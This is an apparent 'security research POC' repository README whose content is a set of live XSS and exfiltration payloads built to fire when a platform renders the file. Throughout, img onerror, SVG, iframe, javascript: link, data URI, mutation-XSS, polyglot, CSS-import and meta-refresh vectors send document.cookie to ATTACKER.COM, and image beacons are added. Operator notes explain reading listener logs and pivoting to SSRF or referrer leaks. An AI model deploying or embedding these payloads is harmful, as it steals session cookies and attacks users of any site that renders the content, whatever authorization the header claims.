# Security Research POC

> This repository is used for authorized security testing and vulnerability research.
> All payloads contained herein are for defensive testing of consented targets only.

## Overview

This repo contains test cases for evaluating how applications process repository content.

---

## Test Vectors

### 1. Raw HTML in Markdown
<img src=x onerror="fetch('https://ATTACKER.COM/r1?c='+document.cookie)">

<img src=x onerror="fetch('https://ATTACKER.COM/r1b?c='+btoa(document.cookie))">

### 2. Script tag (most parsers strip, but worth trying)
<script>fetch('https://ATTACKER.COM/r2?c='+document.cookie)</script>

### 3. SVG-based XSS
<svg/onload="fetch('https://ATTACKER.COM/r3?c='+document.cookie)">

<svg><script>fetch('https://ATTACKER.COM/r3b?c='+document.cookie)</script></svg>

### 4. Iframe injection (srcdoc bypass)
<iframe src="javascript:fetch('https://ATTACKER.COM/r4?c='+parent.document.cookie)"></iframe>

<iframe srcdoc="<script>fetch('https://ATTACKER.COM/r4b?c='+parent.document.cookie)</script>"></iframe>

### 5. Markdown link with javascript: scheme
[Click here](javascript:fetch('https://ATTACKER.COM/r5?c='+document.cookie))

[Reference link][evil]

[evil]: javascript:fetch('https://ATTACKER.COM/r5b?c='+document.cookie)

### 6. Markdown image with onerror
![alt](x "onerror=fetch('https://ATTACKER.COM/r6?c='+document.cookie)")

![alt](javascript:alert(1))

### 7. Data URI
<a href="data:text/html,<script>fetch('https://ATTACKER.COM/r7?c='+document.cookie)</script>">data uri</a>

### 8. Event handlers on common tags
<details open ontoggle="fetch('https://ATTACKER.COM/r8?c='+document.cookie)">
<summary>click</summary>
</details>

<video><source onerror="fetch('https://ATTACKER.COM/r9?c='+document.cookie)"></video>

<audio src=x onerror="fetch('https://ATTACKER.COM/r10?c='+document.cookie)">

<body onload="fetch('https://ATTACKER.COM/r11?c='+document.cookie)">

### 9. Markdown table cell injection
| Column | Value |
|--------|-------|
| Test   | <img src=x onerror="fetch('https://ATTACKER.COM/r12?c='+document.cookie)"> |

### 10. Code block escape attempts
```html
</code><img src=x onerror="fetch('https://ATTACKER.COM/r13?c='+document.cookie)"><code>
```

### 11. CSS-based exfil (no JS needed)
<style>
@import url('https://ATTACKER.COM/r14css');
body { background: url('https://ATTACKER.COM/r14bg'); }
</style>

### 12. Meta refresh / form action
<meta http-equiv="refresh" content="0;url=https://ATTACKER.COM/r15">
<form action="https://ATTACKER.COM/r15form"><input name=cookie></form>

### 13. Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=fetch('https://ATTACKER.COM/r16?c='+document.cookie) )//

### 14. Mutation XSS (mXSS) candidates
<noscript><p title="</noscript><img src=x onerror=fetch('https://ATTACKER.COM/r17?c='+document.cookie)>">

<style><img src="</style><img src=x onerror=fetch('https://ATTACKER.COM/r18?c='+document.cookie)>">

### 15. Markdown autolink abuse
<https://ATTACKER.COM/r19-autolink>

<javascript:fetch('https://ATTACKER.COM/r20?c='+document.cookie)>

---

## Passive Exfil Beacons (no JS — just image/link loads)

These fire on **any** HTML render that resolves external resources:

![beacon-readme](https://ATTACKER.COM/beacon/readme-img-md)

<img src="https://ATTACKER.COM/beacon/readme-img-html">

[link-beacon](https://ATTACKER.COM/beacon/readme-link)

---

## Notes for the operator

- Each payload uses a **unique path** (`r1`, `r2`, ..., `beaconX`) so you can identify in your collaborator/listener logs **exactly** which vector fired.
- If only beacons fire and no `r*` paths hit, the renderer is sanitizing HTML/JS but allowing image loads — try CSS exfil or referrer leaks.
- If `r*` hits arrive **without** cookies, the render is in a sandboxed iframe or a different origin — pivot to internal SSRF / referrer leak.
